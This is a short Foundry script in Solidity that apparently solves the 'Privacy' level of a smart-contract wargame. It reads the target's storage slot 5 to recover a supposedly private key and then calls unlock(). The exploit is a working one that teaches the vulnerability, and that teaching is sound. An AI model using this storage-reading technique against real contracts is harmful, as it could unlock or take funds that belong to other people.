// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {HelperFunctions} from "script/HelperFunctions.s.sol";

// ================================================================
// │                        LEVEL 12 - PRIVACY                    │
// ================================================================
interface IPrivacy {
    function unlock(bytes16 _key) external;
}

contract Exploit is Script, HelperFunctions {
    function run() public {
        address targetContractAddress = getInstanceAddress();
        IPrivacy targetContract = IPrivacy(targetContractAddress);

        bytes16 key = bytes16(vm.load(targetContractAddress, bytes32(uint256(5))));

        vm.startBroadcast();
        targetContract.unlock(key);
        vm.stopBroadcast();
    }
}
